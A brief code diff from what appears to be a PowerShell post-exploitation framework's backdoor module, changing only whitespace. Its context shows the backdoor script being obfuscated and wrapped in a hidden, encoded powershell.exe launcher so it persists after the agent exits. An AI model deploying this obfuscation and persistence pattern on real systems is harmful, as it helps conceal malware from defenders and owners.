@@ -182,8 +182,8 @@ Invoke-ResolverBackdoor"""
 
         script = helpers.keyword_obfuscation(script, self.mainMenu)
         if obfuscate:
-
             script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
+
         # transform the backdoor into something launched by powershell.exe
         # so it survives the agent exiting  
         modifiable_launcher = "powershell.exe -noP -sta -w 1 -enc "
